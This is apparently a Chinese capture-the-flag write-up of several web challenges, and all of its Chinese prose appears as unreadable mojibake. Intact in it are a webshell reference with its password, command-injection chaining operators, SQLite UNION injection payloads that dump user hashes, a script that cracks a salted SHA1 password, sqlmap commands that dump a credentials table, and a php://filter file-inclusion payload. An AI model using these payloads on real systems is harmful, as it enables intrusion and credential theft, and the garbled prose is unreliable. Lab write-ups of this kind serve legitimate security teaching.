ç”¨æ¥å‘æœåŠ¡ç«¯æäº¤æ§åˆ¶æ•°æ®çš„ï¼Œæäº¤çš„æ•°æ®é€šè¿‡æœåŠ¡ç«¯æ„æˆå®Œæ•´çš„aspåŠŸèƒ½è¯­å¥å¹¶æ‰§è¡Œï¼Œä¹Ÿå°±æ˜¯ç”Ÿæˆæˆ‘ä»¬æ‰€éœ€è¦çš„aspæœ¨é©¬æ–‡ä»¶ ç”¨ä¸­å›½èœåˆ€æˆ–è€…èšå‰‘ç­‰å·¥å…·å¯ä»¥ä¸Šä¼ æˆ–æ‰§è¡Œå‘½ä»¤ï¼Œå¯†ç æ˜¯shellã€‚ è¿æ¥æˆåŠŸï¼š é€‰æ‹©åŒå‡»ï¼š çœ‹åˆ°flag.txt,æ‰“å¼€ï¼š command_executioné¢˜ç›®æè¿°ï¼šå°å®å†™äº†ä¸ªpingåŠŸèƒ½,ä½†æ²¡æœ‰å†™waf,Xè€å¸ˆå‘Šè¯‰å¥¹è¿™æ˜¯éå¸¸å±é™©çš„ï¼Œä½ çŸ¥é“ä¸ºä»€ä¹ˆå—ã€‚ çŸ¥è¯†è¡¥å……ï¼š1ã€ping ï¼ˆç½‘ç»œè¯Šæ–­å·¥å…·ï¼‰Pingæ˜¯Windowsã€Unixå’ŒLinuxç³»ç»Ÿä¸‹çš„ä¸€ä¸ªå‘½ä»¤ã€‚pingä¹Ÿå±äºä¸€ä¸ªé€šä¿¡åè®®ï¼Œæ˜¯TCP/IPåè®®çš„ä¸€éƒ¨åˆ†ã€‚åˆ©ç”¨â€œpingâ€å‘½ä»¤å¯ä»¥æ£€æŸ¥ç½‘ç»œæ˜¯å¦è¿é€šï¼Œå¯ä»¥å¾ˆå¥½åœ°å¸®åŠ©æˆ‘ä»¬åˆ†æå’Œåˆ¤å®šç½‘ç»œæ•…éšœã€‚åº”ç”¨æ ¼å¼ï¼špingç©ºæ ¼IPåœ°å€ã€‚è¯¥å‘½ä»¤è¿˜å¯ä»¥åŠ è®¸å¤šå‚æ•°ä½¿ç”¨ï¼Œå…·ä½“æ˜¯é”®å…¥pingæŒ‰å›è½¦å³å¯çœ‹åˆ°è¯¦ç»†è¯´æ˜ã€‚ä½œä¸ºä¸€ä¸ªç”Ÿæ´»åœ¨ç½‘ç»œä¸Šçš„ç®¡ç†å‘˜æˆ–è€…é»‘å®¢æ¥è¯´ï¼Œpingå‘½ä»¤æ˜¯ç¬¬ä¸€ä¸ªå¿…é¡»æŒæ¡çš„DOSå‘½ä»¤ï¼Œå®ƒæ‰€åˆ©ç”¨çš„åŸç†æ˜¯è¿™æ ·çš„ï¼šåˆ©ç”¨ç½‘ç»œä¸Šæœºå™¨IPåœ°å€çš„å”¯ä¸€æ€§ï¼Œç»™ç›®æ ‡IPåœ°å€å‘é€ä¸€ä¸ªæ•°æ®åŒ…ï¼Œå†è¦æ±‚å¯¹æ–¹è¿”å›ä¸€ä¸ªåŒæ ·å¤§å°çš„æ•°æ®åŒ…æ¥ç¡®å®šä¸¤å°ç½‘ç»œæœºå™¨æ˜¯å¦è¿æ¥ç›¸é€šï¼Œæ—¶å»¶æ˜¯å¤šå°‘ã€‚pingæŒ‡çš„æ˜¯ç«¯å¯¹ç«¯è¿é€šï¼Œé€šå¸¸ç”¨æ¥ä½œä¸ºå¯ç”¨æ€§çš„æ£€æŸ¥ï¼Œ ä½†æ˜¯æŸäº›ç—…æ¯’æœ¨é©¬ä¼šå¼ºè¡Œå¤§é‡è¿œç¨‹æ‰§è¡Œpingå‘½ä»¤æŠ¢å ä½ çš„ç½‘ç»œèµ„æºï¼Œå¯¼è‡´ç³»ç»Ÿå˜æ…¢ï¼Œç½‘é€Ÿå˜æ…¢ã€‚ä¸¥ç¦pingå…¥ä¾µä½œä¸ºå¤§å¤šæ•°é˜²ç«å¢™çš„ä¸€ä¸ªåŸºæœ¬åŠŸèƒ½æä¾›ç»™ç”¨æˆ·è¿›è¡Œé€‰æ‹©ã€‚ 2ã€æœ‰å…³å‘½ä»¤æ‰§è¡Œçš„çŸ¥è¯†windowsæˆ–linuxä¸‹ï¼š 1234command1 &amp; command2 ï¼šå…ˆæ‰§è¡Œcommand2åæ‰§è¡Œcommand1command1 &amp;&amp; command2 ï¼šå…ˆæ‰§è¡Œcommand1åæ‰§è¡Œcommand2command1 | command2 ï¼šåªæ‰§è¡Œcommand2command1 || command2 ï¼šcommand1æ‰§è¡Œå¤±è´¥ï¼Œå†æ‰§è¡Œcommand2(è‹¥command1æ‰§è¡ŒæˆåŠŸï¼Œå°±ä¸å†æ‰§è¡Œcommand2) 3ã€WAFWebåº”ç”¨é˜²æŠ¤ç³»ç»Ÿï¼ˆä¹Ÿç§°ä¸ºï¼šç½‘ç«™åº”ç”¨çº§å…¥ä¾µé˜²å¾¡ç³»ç»Ÿã€‚è‹±æ–‡ï¼šWeb Application Firewallï¼Œç®€ç§°ï¼š WAFï¼‰ã€‚åˆ©ç”¨å›½é™…ä¸Šå…¬è®¤çš„ä¸€ç§è¯´æ³•ï¼šWebåº”ç”¨é˜²ç«å¢™æ˜¯é€šè¿‡æ‰§è¡Œä¸€ç³»åˆ—é’ˆå¯¹HTTP/HTTPSçš„å®‰å…¨ç­–ç•¥æ¥ä¸“é—¨ä¸ºWebåº”ç”¨æä¾›ä¿æŠ¤çš„ä¸€æ¬¾äº§å“ã€‚Webåº”ç”¨é˜²ç«å¢™ä¼šå¯¹HTTPçš„è¯·æ±‚è¿›è¡Œå¼‚å¸¸æ£€æµ‹ï¼Œæ‹’ç»ä¸ç¬¦åˆHTTPæ ‡å‡†çš„è¯·æ±‚ã€‚å¹¶ä¸”ï¼Œå®ƒä¹Ÿå¯ä»¥åªå…è®¸HTTPåè®®çš„éƒ¨åˆ†é€‰é¡¹é€šè¿‡ï¼Œä»è€Œå‡å°‘æ”»å‡»çš„å½±å“èŒƒå›´ã€‚ç”šè‡³ï¼Œä¸€äº›Webåº”ç”¨é˜²ç«å¢™è¿˜å¯ä»¥ä¸¥æ ¼é™å®šHTTPåè®®ä¸­é‚£äº›è¿‡äºæ¾æ•£æˆ–æœªè¢«å®Œå…¨åˆ¶å®šçš„é€‰é¡¹ã€‚ï¼ˆWAFç»•è¿‡ï¼‰æ­¤é¢˜ç»™å‡ºæœªå¼€WAFï¼Œæ‰€ä»¥ä¸ç”¨è€ƒè™‘è¿™ä¸€æ­¥ã€‚ 4ã€è¿˜éœ€è¦æŒæ¡ä¸€äº›å¸¸ç”¨çš„å‘½ä»¤ls å¯¹äºç›®å½•ï¼Œè¯¥å‘½ä»¤åˆ—å‡ºè¯¥ç›®å½•ä¸‹çš„æ‰€æœ‰å­ç›®å½•ä¸æ–‡ä»¶ã€‚å¯¹äºæ–‡ä»¶ï¼Œå°†åˆ—å‡ºæ–‡ä»¶åä»¥åŠå…¶ä»–ä¿¡æ¯ã€‚Cd æ”¹å˜å·¥ä½œç›®å½•ï¼Œå°†å½“å‰å·¥ä½œç›®å½•æ”¹å˜åˆ°æŒ‡å®šçš„ç›®å½•ä¸‹ã€‚catæ˜¯æ‰“å°æ–‡ä»¶å†…å®¹tac æ˜¯åå‘æ‰“å°less æ–‡ä»¶åï¼šåˆ†é¡µæ˜¾ç¤ºæ–‡ä»¶å†…å®¹ï¼ˆå¦‚less /etc/passwdï¼‰Find æ²¿ç€æ–‡ä»¶å±‚æ¬¡ç»“æ„å‘ä¸‹éå†ï¼ŒåŒ¹é…ç¬¦åˆæ¡ä»¶çš„æ–‡ä»¶ï¼Œå¹¶æ‰§è¡Œç›¸åº”æ“ä½œã€‚å…³äºfindå¯ä»¥å‚è€ƒï¼šhttps://www.jianshu.com/p/16af649d9b6d*&lt;åˆ©ç”¨æˆªæ–­æ¥æ‰§è¡Œè¡Œçš„å‘½ä»¤ï¼Œå¦‚â€™$â€™ å’Œ â€˜ ; â€˜å’Œ â€˜|â€™ å’Œ â€˜-â€˜ å’Œ â€˜(â€˜ å’Œ â€˜ ) â€˜ å’Œ â€˜ â€œ â€˜ å’Œ â€˜||â€™ å’Œâ€™&amp;&amp;â€™ å’Œ â€˜&amp;â€™ å’Œ â€˜{â€˜ å’Œ â€˜}â€™ç­‰&gt;* å®é™…æ“ä½œï¼š è¯•ç€ä½¿ç”¨å‘½ä»¤è¿æ¥ç¬¦ï¼ŒæŸ¥çœ‹ç›®å½• å‘ç°æœ‰homeç›®å½•ï¼Œçœ‹çœ‹é‡Œé¢æœ‰å•¥ï¼š å‘ç°æœ‰flag.txt;æˆ–è€…ç›´æ¥æ ¹æ®æ–‡ä»¶åæˆ–æ­£åˆ™è¡¨è¾¾å¼è¿›è¡Œæœç´¢ï¼Œå¦‚ä¸‹ï¼š å¾—åˆ°flag.txtåœ¨homeä¸‹ï¼Œcatä¸€ä¸‹ï¼š åŒæ—¶è¿™é“é¢˜ï¼ŒæŸ¥çœ‹ä»£ç å¯ä»¥å‘ç°ï¼šPOSTä¼ å‚æ˜¯é€šè¿‡å‚æ•°targetï¼Œè€Œtargetå°±æ˜¯æˆ‘ä»¬æ‰€è¦è¾“å…¥çš„å€¼ å°è¯•postä¼ å€¼ï¼š å¾—åˆ°flag: simple_phpé¢˜ç›®æè¿°ï¼šå°å®å¬è¯´phpæ˜¯æœ€å¥½çš„è¯­è¨€,äºæ˜¯å¥¹ç®€å•å­¦ä¹ ä¹‹åå†™äº†å‡ è¡Œphpä»£ç ã€‚ å®é™…æ“ä½œï¼šæ‰“å¼€é“¾æ¥ï¼š å¾ˆç®€å•çš„PHPä»£ç ï¼šaè¦ç­‰äº0ï¼Œåˆä¸èƒ½ç­‰äº0ï¼›bä¸èƒ½æ˜¯æ•°å­—ï¼Œä½†è¿˜è¦å¤§äº1234 is_numericï¼ˆï¼‰æ¥å‡½æ•°ç”¨äºæ£€æµ‹å˜é‡æ˜¯å¦ä¸ºæ•°å­—æˆ–æ•°å­—å­—ç¬¦ä¸²ã€‚å¦‚æœæŒ‡å®šçš„å˜é‡æ˜¯æ•°å­—å’Œæ•°å­—å­—ç¬¦ä¸²åˆ™è¿”å›TRUEï¼Œå¦åˆ™è¿”å›FALSEã€‚ æ­¤å¤„é phpå¼±ç±»å‹æ¯”è¾ƒï¼šå¯æŸ¥çœ‹æˆ‘çš„è¿™ç¯‡åšæ–‡æ„é€ å¦‚ä¸‹url: é«˜æ‰‹è¿›é˜¶åŒºbaby_webé¢˜ç›®æç¤ºï¼šæƒ³æƒ³åˆå§‹é¡µé¢æ˜¯å“ªä¸ª å®é™…æ“ä½œï¼šè€ƒè™‘åˆ°å¯èƒ½æ˜¯é¡µé¢302é‡å®šå‘æŠ“åŒ…å¾—åˆ°flag FlatScienceå®é™…æ“ä½œç‚¹è¿›å»æœ‰å¥½å¤šé“¾æ¥ï¼Œä¸‹è½½PDFï¼Œè·³å›ç­‰ï¼› æŸ¥çœ‹robots.txt(robots.txt:æ˜¯æœç´¢å¼•æ“ä¸­è®¿é—®ç½‘ç«™çš„æ—¶å€™è¦æŸ¥çœ‹çš„ç¬¬ä¸€ä¸ªæ–‡ä»¶ã€‚robots.txtæ–‡ä»¶å‘Šè¯‰èœ˜è››ç¨‹åºåœ¨æœåŠ¡å™¨ä¸Šä»€ä¹ˆæ–‡ä»¶æ˜¯å¯ä»¥è¢«æŸ¥çœ‹çš„ã€‚)è®¿é—®:http://111.198.29.45:34978/robots.txt 123User-agent: *Disallow: /login.phpDisallow: /admin.php è®¿é—®login.php:å¾—åˆ°äº†ä¸€ä¸ªç™»é™†é¡µé¢ï¼Œå°è¯•sqli,æç¤ºï¼š 12Warning: SQLite3::query(): Unable to prepare statement: 1, unrecognized token: \"2801497d9ca18eef4382b18d1889b8bc97e28461\" in /var/www/html/login.php on line 47Some Error occourred! å¯ä»¥çœ‹åˆ°ä½¿ç”¨çš„æ˜¯SQLiteæ•°æ®åº“,è¿˜æœ‰åŠ å¯†æ“ä½œï¼Ÿ è®¿é—®ç½‘é¡µæºç ï¼š æœ‰å‚æ•°æç¤ºdebug;å°è¯•è®¿é—®login.php?debugå¾—åˆ°å¦‚ä¸‹phpä»£ç ï¼š 1234567891011121314151617181920212223242526&lt;?phpif(isset($_POST['usr']) &amp;&amp; isset($_POST['pw']))&#123; $user = $_POST['usr']; $pass = $_POST['pw']; $db = new SQLite3('../fancy.db'); $res = $db-&gt;query(\"SELECT id,name from Users where name='\".$user.\"' and password='\".sha1($pass.\"Salz!\").\"'\"); if($res)&#123; $row = $res-&gt;fetchArray(); &#125; else&#123; echo \"&lt;br&gt;Some Error occourred!\"; &#125; if(isset($row['id']))&#123; setcookie('name',' '.$row['name'], time() + 60, '/'); header(\"Location: /\"); die(); &#125;&#125;if(isset($_GET['debug']))highlight_file('login.php');?&gt; å¯ä»¥çœ‹åˆ°SQLçš„æŸ¥è¯¢è¯­å¥ï¼Œå¹¶ä¸”å¯¹å¯†ç è¿›è¡Œäº†åŠ å¯†æ“ä½œ(sha1+salt&lt;=ï¼ˆalzï¼ï¼‰);é¡µé¢æ³¨å…¥ä¸æˆï¼ŒæŠ“åŒ…åˆ†æä¸‹ï¼šæ„é€ ï¼š 1usr='union select name,sql from sqlite_master--+n&amp;pw=233 å¾—åˆ°ï¼š 1Set-Cookie: name=+CREATE+TABLE+Users%28id+int+primary+key%2Cname+varchar%28255%29%2Cpassword+varchar%28255%29%2Chint+varchar%28255%29%29; URLç¼–ç è½¬æ¢ä¸€ä¸‹ï¼š%27=&gt;â€™;%28=&gt;(;%29=&gt;); 12CREATE TABLE Users(id int primary key,name varchar(255),password varchar(255),hint varchar(255)) çœ‹åˆ°Usersè¡¨ã€id,name,password.hintå­—æ®µï¼›æ„é€ æŸ¥è¯¢è¯­å¥ï¼š 12345idusr='union select id,id from Users limit 0,1--&amp;pw=233usr='union select id,id from Users limit 1,1--&amp;pw=233usr='union select id,id from Users limit 2,1--&amp;pw=233å¾—åˆ°3ä¸ªidï¼› 1234usr='union select id,name from Users limit 0,1--&amp;pw=233usr='union select id,name from Users limit 1,1--&amp;pw=233usr='union select id,name from Users limit 2,1--&amp;pw=233å¾—åˆ°nameï¼šadminã€fritzeã€hansi 1234567usr='union select id,password from Users limit 0,1--&amp;pw=233usr='union select id,password from Users limit 1,1--&amp;pw=233usr='union select id,password from Users limit 2,1--&amp;pw=233å¾—åˆ°passwordï¼š3fab54a50e770d830c0416df817567662a9dc85c54eae8935c90f467427f05e4ece82cf569f8950734b0bb7c304949f9ff2fc101eef0f048be10d3bd 1234567usr='union select id,hint from Users limit 0,1--&amp;pw=233usr='union select id,hint from Users limit 1,1--&amp;pw=233usr='union select id,hint from Users limit 2,1--&amp;pw=233å¾—åˆ°hintï¼šmy+fav+word+in+my+fav+paper%3F%21my+love+is%E2%80%A6%3Fthe+password+is+password æ ¹æ®adminç”¨æˆ·çš„æç¤ºmy fav word in my fav paperï¼Ÿï¼åº”è¯¥æ˜¯ï¼šå¯†ç +â€Salz!â€åšsha1å¤„ç†ï¼Œå¯†ç åº”è¯¥å°±äº§ç”Ÿäºpdfä¸­ï¼› å› ä¸ºæˆ‘é—¨çŸ¥é“äº†åŠ å¯†ç»“æœç›´æ¥è§£å¯†å»æ‰Salzå°±å¾—åˆ°å¯†ç äº†ï¼š è§£å¯† ä¹Ÿå¯ä»¥ç”¨pdfä¸­çš„å•è¯è¿›è¡Œ+Salz!å†åšsha1ï¼› å€Ÿç”¨ä¸€ä¸‹åˆ«äººçš„Pythonè„šæœ¬ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041from cStringIO import StringIOfrom pdfminer.pdfinterp import PDFResourceManager, PDFPageInterpreterfrom pdfminer.converter import TextConverterfrom pdfminer.layout import LAParamsfrom pdfminer.pdfpage import PDFPageimport sysimport stringimport osimport hashlib def get_pdf(): return [i for i in os.listdir(\"./\") if i.endswith(\"pdf\")] def convert_pdf_2_text(path): rsrcmgr = PDFResourceManager() retstr = StringIO() device = TextConverter(rsrcmgr, retstr, codec='utf-8', laparams=LAParams()) interpreter = PDFPageInterpreter(rsrcmgr, device) with open(path, 'rb') as fp: for page in PDFPage.get_pages(fp, set()): interpreter.process_page(page) text = retstr.getvalue() device.close() retstr.close() return text def find_password(): pdf_path = get_pdf() for i in pdf_path: print \"Searching word in \" + i pdf_text = convert_pdf_2_text(i).split(\" \") for word in pdf_text: sha1_password = hashlib.sha1(word+\"Salz!\").hexdigest() if sha1_password == '3fab54a50e770d830c0416df817567662a9dc85c': print \"Find the password :\" + word exit() if __name__ == \"__main__\": find_password() çŸ¥è¯†è¡¥å……â€˜â€™â€™os.listdir() æ–¹æ³•ç”¨äºè¿”å›æŒ‡å®šçš„æ–‡ä»¶å¤¹åŒ…å«çš„æ–‡ä»¶æˆ–æ–‡ä»¶å¤¹çš„åå­—çš„åˆ—è¡¨ã€‚å®ƒä¸åŒ…æ‹¬ . å’Œ .. å³ä½¿å®ƒåœ¨æ–‡ä»¶å¤¹ä¸­ã€‚åªæ”¯æŒåœ¨ Unix, Windows ä¸‹ä½¿ç”¨ã€‚è¯­æ³•listdir()æ–¹æ³•è¯­æ³•æ ¼å¼å¦‚ä¸‹ï¼šos.listdir(path)å‚æ•°:path â€“ éœ€è¦åˆ—å‡ºçš„ç›®å½•è·¯å¾„è¿”å›å€¼:è¿”å›æŒ‡å®šè·¯å¾„ä¸‹çš„æ–‡ä»¶å’Œæ–‡ä»¶å¤¹åˆ—è¡¨ã€‚â€˜â€™â€™â€˜â€™â€™endswith() æ–¹æ³•ç”¨äºåˆ¤æ–­å­—ç¬¦ä¸²æ˜¯å¦ä»¥æŒ‡å®šåç¼€ç»“å°¾ï¼Œå¦‚æœä»¥æŒ‡å®šåç¼€ç»“å°¾è¿”å›Trueï¼Œå¦åˆ™è¿”å›Falseã€‚å¯é€‰å‚æ•°â€startâ€ä¸â€endâ€ä¸ºæ£€ç´¢å­—ç¬¦ä¸²çš„å¼€å§‹ä¸ç»“æŸä½ç½®ã€‚â€˜â€™â€™â€˜â€™â€™hashlibæ˜¯æ¶‰åŠå®‰å…¨æ•£åˆ—å’Œæ¶ˆæ¯æ‘˜è¦ï¼Œæä¾›å¤šä¸ªä¸åŒçš„åŠ å¯†ç®—æ³•æ¥å£ï¼Œå¦‚SHA1ã€SHA224ã€SHA256ã€SHA384ã€SHA512ã€MD5ç­‰ã€‚å…¶ä¸­hash.digest()è¿”å›æ‘˜è¦ï¼Œä½œä¸ºäºŒè¿›åˆ¶æ•°æ®å­—ç¬¦ä¸²å€¼hash.hexdigest()è¿”å›æ‘˜è¦ï¼Œä½œä¸ºåå…­è¿›åˆ¶æ•°æ®å­—ç¬¦ä¸²å€¼â€˜â€™â€™ å¾—åˆ°å¯†ç ï¼šThinJerboaè®¿é—®ï¼šadmin.php 12username=adminpassword=ThinJerboa å¾—åˆ°flag Caté¢˜ç›®æè¿°ï¼šä»…ç»™å‡ºäº†è¿™æ ·ä¸€ä¸ªé¡µé¢ï¼š å®é™…æ“ä½œï¼šè¾“å…¥catï¼Œå¾—åˆ°ï¼š 123456PING cat.ad-world-198302431-4658.rancher.internal (10.42.197.21) 56(84) bytes of data.64 bytes from b4fccc7cf554 (10.42.197.21): icmp_seq=1 ttl=64 time=0.045 ms--- cat.ad-world-198302431-4658.rancher.internal ping statistics ---1 packets transmitted, 1 received, 0% packet loss, time 0msrtt min/avg/max/mdev = 0.045/0.045/0.045/0.000 ms å¹¶åœ¨URLä¸­å¦‚æ­¤ä¼ å‚ï¼š 1http://111.198.29.45:35113/index.php?url=cat è¾“å…¥127.0.0.1ï¼š 123456PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.061 ms--- 127.0.0.1 ping statistics ---1 packets transmitted, 1 received, 0% packet loss, time 0msrtt min/avg/max/mdev = 0.061/0.061/0.061/0.000 ms å°è¯•ä½¿ç”¨å‘½ä»¤è¿æ¥ç¬¦/ç®¡é“å‘½ä»¤ï¼Œå‡è¢«å±è”½ï¼›ç›®å‰ä»…çŸ¥é“ï¼Œè¾“å…¥æ¡†é€šè¿‡ç”¨æˆ·è¾“å…¥è¿›è¡ŒGETæ–¹å¼ä¼ å‚ï¼›(æ­¤å¤„è¯·è·³è½¬æ–‡æœ« orz)é‚£ä¹ˆåªèƒ½ä»urlå…¥æ‰‹äº†ï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰å¯èƒ½çˆ†å‡ºä¸€äº›æœ‰ç”¨çš„ä¿¡æ¯ï¼›æµ‹è¯•å‘ç°è¶…è¿‡ASCllå¯æ‰“å°å­—ç¬¦ä¹‹å¤–çš„urlç¼–ç éƒ½ä¼šæŠ¥é”™ï¼Œæ¯”å¦‚é”®å…¥http://111.198.29.45:35113/index.php?url=%8c ï¼š ç»™å‡ºæŠ¥é”™ä¿¡æ¯ï¼š å¯ä»¥æ˜æ˜¾çœ‹åˆ°ä½¿ç”¨çš„æ˜¯Djangoæ¡†æ¶ï¼› æŸ¥çœ‹é…ç½®æ–‡ä»¶ä¿¡æ¯ï¼šsettings.py åœ¨æŠ¥é”™ä¿¡æ¯ä¸­æœç´¢databaseï¼Œå‘ç°çš„åˆ°æœ‰å…³æ•°æ®åº“å†…å®¹ï¼š å‚è€ƒï¼š é€šè¿‡http://111.198.29.45:35113/index.php?url=@/opt/api/database.sqlite3 å¾—åˆ°æ•°æ®åº“å†…å®¹ï¼šæŸ¥æ‰¾ctfå…³é”®å­—ï¼š æºç é‡Œå°±æ˜¯GETå•Šï¼Œé‚£è¿™ä¸ªåˆæ˜¯å•¥ï¼Ÿï¼Ÿï¼Ÿpost?ï¼orz orz orz ics-04é—®é¢˜åˆ†æï¼š æœ¬é¢˜å’Œä¹‹å‰å‡ é¢˜ä½¿ç”¨äº†ç›¸åŒçš„é¡µé¢ï¼Œæ ¹æ®æç¤ºæ¼æ´ä½ç½®åº”è¯¥åœ¨ç™»å½•å’Œæ³¨å†Œä¸Šï¼Œéšä¾¿æ³¨å†Œéƒ½èƒ½æˆåŠŸï¼Œä½†æ˜¯ç™»å½•æ—¶æç¤ºâ€œæ™®é€šç”¨æˆ·ç™»å½•æˆåŠŸï¼Œæ²¡ä»€ä¹ˆç”¨â€ï¼› å°è¯•sqlæ³¨å…¥ï¼Œè¿™ä¸¤ä¸ªåœ°æ–¹å¹¶æ²¡æœ‰ä»€ä¹ˆæ³¨å…¥ç‚¹ï¼Œçœ‹åˆ°è¿˜æœ‰ä¸ªâ€œå¿˜è®°å¯†ç ï¼Ÿâ€ï¼Œå¯ä»¥æ­£å¸¸ä½¿ç”¨æ‰¾å›å¯†ç ï¼Œå°è¯•sqlæ³¨å…¥ï¼›åˆ©ç”¨sqlmapæ£€æµ‹ï¼Œå‘ç°å­˜åœ¨æ¼æ´ï¼› æ„é€ å‘½ä»¤çŒœè§£æ•°æ®åº“åï¼šâ€“dbs æšä¸¾æ•°æ®åº“ç®¡ç†ç³»ç»Ÿæ•°æ®åº“1sqlmap -u \"http://111.198.29.45:33931/findpwd.php\" --data=\"username=1\" --dbs å¾—åˆ°åº“åç»“æœï¼› åº“å å¯¹æ¯ä¸ªæ•°æ®åº“è¿›è¡Œè¡¨åçŒœè§£ï¼›1sqlmap -u \"http://111.198.29.45:33931/findpwd.php\" --data=\"username=1\" -D cetc004 --tables å¯¹æ•°æ®åº“cetc004ä¸­è¡¨userçŒœè§£åˆ—åï¼›â€“columns æšä¸¾DBMSæ•°æ®åº“è¡¨åˆ—1sqlmap -u \"http://111.198.29.45:33931/findpwd.php\" --data=\"username=1\" -D cetc004 -T user --columns å¯¹usernameå’Œpasswordè¿›è¡Œå†…å®¹æŸ¥è¯¢ï¼›â€“dump è½¬å‚¨æ•°æ®åº“ç®¡ç†ç³»ç»Ÿçš„æ•°æ®åº“ä¸­çš„è¡¨é¡¹ 1sqlmap -u \"http://111.198.29.45:33931/findpwd.php\" --data=\"username=1\" -D cetc004 -T user -C \"username,password\" --dump ç”±äºå¯ä»¥é‡å¤æ³¨å†Œï¼Œäºæ˜¯ä½¿ç”¨c3tlwDmln23æ³¨å†Œï¼Œæ³¨å†ŒæˆåŠŸï¼Œç™»é™†åå¾—åˆ°flagï¼› æ­¤æ—¶å¯¹usernameæŸ¥è¯¢å¯å¾—åˆ°ä¸¤æ¡ç»“æœï¼›ç¬¬ä¸€è¡Œä¸ºåŸæ¥çš„ï¼Œç¬¬äºŒè¡Œä¸ºåˆšæ‰æ³¨å†Œçš„ï¼Œæ‰€ä»¥æ¼æ´åŸå› ä¸ºæœªå¯¹ç”¨æˆ·åé‡å¤é—®é¢˜åŠ ä»¥è¿‡æ»¤ï¼Œé€ æˆæ•°æ®åº“æŸ¥è¡¨é”™è¯¯ï¼›çŸ¥è¯†è¡¥å……ï¼šå¦‚æœè§‰å¾—æ‰“å¼€Kaliè™šæ‹Ÿæœºéº»çƒ¦ï¼Œå¯ä»¥åœ¨Windowsä¸Šå®‰è£…ä¸€ä¸ªsqlmapï¼Œå…·ä½“æ­¥éª¤ç½‘ä¸Šéƒ½æœ‰æ•™ç¨‹ï¼›å¦‚æœé‡åˆ°â€œä¸æ˜¯å†…éƒ¨æˆ–å¤–éƒ¨å‘½ä»¤ï¼Œä¹Ÿä¸æ˜¯å¯è¿è¡Œçš„ç¨‹åº æˆ–æ‰¹å¤„ç†æ–‡ä»¶ã€‚â€æ—¶ï¼Œçœ‹ä¸€ä¸‹è‡ªå·±çš„â€œèµ·å§‹ä½ç½®â€çš„è·¯å¾„ï¼Œæ˜¯ä¸æ˜¯æ²¡æœ‰æŒ‡å®šæ¸…æ¥šï¼Œå¦‚æœå¡«å†™çš„æ˜¯C:\\Python27\\sqlmapï¼›é‚£ä¹ˆè¯·æŸ¥çœ‹sqlmapä¸‹åˆ°sqlmap python Fileæ˜¯å¦è¿˜æœ‰é—´æ¥æ–‡ä»¶å¤¹ï¼Œè‹¥æœ‰ç›´æ¥åŠ ä¸Š\\nameï¼›æˆ–è€…ç›´æ¥å¤åˆ¶æ”¹åä¸ºsqlmapæ”¾åœ¨Python27ä¸‹ï¼›åˆ é™¤åŸæ¥çš„æ–‡ä»¶ï¼›å…³äºsqlmapä½¿ç”¨ï¼šhttps://blog.csdn.net/qq_33530840/article/details/82144515 ics-05é¢˜ç›®æè¿°ï¼šå…¶ä»–ç ´åè€…ä¼šåˆ©ç”¨å·¥æ§äº‘ç®¡ç†ç³»ç»Ÿè®¾å¤‡ç»´æŠ¤ä¸­å¿ƒçš„åé—¨å…¥ä¾µç³»ç»Ÿ å®é™…æ“ä½œï¼šç‚¹å‡»é“¾æ¥è¿›å…¥â€œå·¥æ§äº‘ç®¡ç†ç³»ç»Ÿâ€ï¼Œæ ¹æ®é¢˜ç›®è¦æ±‚åªèƒ½ç‚¹å‡»â€œè®¾å¤‡ç»´æŠ¤ä¸­å¿ƒâ€ï¼›å¾—åˆ°å¦‚ä¸‹é¡µé¢ï¼š é™¤äº†index.phpé¡µé¢ï¼Œæ²¡æœ‰å…¶ä»–æœ‰æ•ˆä¿¡æ¯ï¼ŒæŸ¥çœ‹æºç ï¼š å¯ä»¥çœ‹åˆ°?page=indedx;ç”±äºå‡ºç°pageè¿™ä¸ªgetå‚æ•°ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•ä¸€ä¸‹æ˜¯å¦å­˜åœ¨æ–‡ä»¶åŒ…å«æºç æ¼æ´ï¼› **æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ï¼ˆLFIæ¼æ´ï¼‰çš„é»‘ç›’åˆ¤æ–­æ–¹æ³•ï¼šå•çº¯çš„ä»URLåˆ¤æ–­çš„è¯ï¼ŒURLä¸­pathã€dirã€fileã€pagã€pageã€archiveã€pã€engã€è¯­è¨€æ–‡ä»¶ç­‰ç›¸å…³å…³é”®å­—çœ¼çš„æ—¶å€™,å¯èƒ½å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´:ä¸»è¦æ¶‰åŠåˆ°çš„å‡½æ•°ï¼šinclude(),require()ã€include_once(),require_once()magic_quotes_gpc()ã€allow_url_fopen()ã€allow_url_include()ã€move_uploaded_file() ã€readfile() file()ã€and file_get_contents()ã€upload_tmp_dir()ã€post_max_size()ã€and max_input_time()ç­‰å…¸å‹æ¼æ´ä»£ç ï¼š&lt;!â€“?php include($_GET[â€˜pagesâ€™].â€˜.phpâ€™); ?â€“&gt;å‚è€ƒæ–‡ç« ï¼šhttps://blog.csdn.net/qq_29419013/article/details/81202358**å°è¯•è¯»å–index.phpçš„é¡µé¢æºç ï¼Œé€šè¿‡phpå†…ç½®åè®®ç›´æ¥è¯»å–ä»£ç ï¼š?page=php://filter/read=convert.base64-encode/resource=index.phpå¾—åˆ°å¾ˆé•¿ä¸€ä¸²base64ç¼–ç ï¼Œè§£ç å¾—åˆ°æºç ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140&lt;?phperror_reporting(0);@session_start();posix_setuid(1000);?&gt;&lt;!DOCTYPE HTML&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=\"utf-8\"&gt; &lt;meta name=\"renderer\" content=\"webkit\"&gt; &lt;meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge,chrome=1\"&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1, maximum-scale=1\"&gt; &lt;link rel=\"stylesheet\" href=\"layui/css/layui.css\" media=\"all\"&gt; &lt;title&gt;è®¾å¤‡ç»´æŠ¤ä¸­å¿ƒ&lt;/title&gt; &lt;meta charset=\"utf-8\"&gt;&lt;/head&gt;&lt;body&gt; &lt;ul class=\"layui-nav\"&gt; &lt;li 